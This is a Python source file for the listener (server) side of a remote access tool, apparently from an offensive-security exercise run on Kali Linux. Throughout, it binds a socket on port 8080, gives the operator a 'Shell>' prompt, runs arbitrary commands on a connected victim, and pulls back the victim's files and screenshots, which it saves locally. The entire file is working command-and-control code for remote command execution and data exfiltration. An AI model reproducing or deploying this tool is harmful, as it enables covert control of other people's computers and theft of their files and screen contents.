#server side
#screen capture
import os
import socket
def transfer(conn, command, operation):
    conn.send(command.encode())

    if (operation == "grab"):
        grab, path = command.split("*")
        f = open('root/Desktop/' +path, 'wb')

    if(operation == "screenshot"):
        filename = "screenshot.png"
        f = open('/home/kali/Desktop/' +filename, 'wb')
            
    while True:
        bits = conn.recv(5000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # write those last recieved bits without the word DONE
            f.close()
            print('[+] Transfer complete.')
            break
        if 'File not found'.encode() in bits:
            print('[-] File not found.')
            break
        f.write(bits)
    print("File transfer complete.")

def connecting():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('10.0.0.128', 8080))
    s.listen(1)
    print("[+] Listening for income TCP connection on port 8080")
    conn, addr = s.accept()
    print("[+] Connected to", addr)

    while True:
        command = input("Shell>")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command, "grab")
        elif 'screenshot' in command:
            transfer(conn, command, "screenshot")
        elif 'priv' in command:
            conn.send('priv'.encode())
            print(conn.recv(5000).decode())
        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())
def main():
    connecting()
main()
